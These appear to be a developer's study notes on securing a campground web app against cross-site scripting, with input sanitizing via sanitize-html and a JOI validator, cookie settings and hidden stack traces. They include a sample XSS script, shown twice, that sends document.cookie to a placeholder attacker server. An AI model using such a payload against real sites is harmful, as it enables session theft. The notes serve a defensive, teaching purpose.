





**** Cross site scripting (XSS):

Hackers can steal your cookies by making you click on a shortened url (phishing attack) to a website,
which runs that script on browser to render things in the dom. For eg: https://xss-game.appspot.com/level1

This is a potential script:

<script>new Image().src="mybadserver/hacker?output="document.cookie;</script>

Note that whenever a new Image is created, browser sends a HTTP request along with src (in this case, src contains the stolen cookie).

This is how the actual full length link might look like:

www.yourwebsite.com?name=<script>new Image().src="mybadserver/hacker?output="document.cookie;</script>

Cheatsheet to evade XSS:
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

In our app, XSS is possible if a user edits a campground title and append it with <h1> HI! </h1>,
this heading will show up on click the marker on the map (since it treates heading like html)

JOI does not do html validation, although express-validator does it but has weird syntax.

Thankfully JOI allows you to write your own validators, which is what we have done in joiSchemas in extension().js.
Also we have to install a npm package called sanitize-html.
see docs: https://www.npmjs.com/package/sanitize-html

This gives us sanitizeHtml() which can be used as follows: sanitizeHtml('<script>alert("asd")</script>');
output: ''
checkout our user defined validator called "escapeHTML" in joiSchemas.js

XSS is taught in first 5 mins of the most basic hacking 101 classes, since its an easy win for hacker.

**** Cookie based security:

use a user-defined name/key for cookie.
also use (change/configure) cookie over HTTPS connections only!


**** Hiding errors:

dont show the stack trace (during errors) in production enviroments.
users and hackers dont need to see your folder structure!

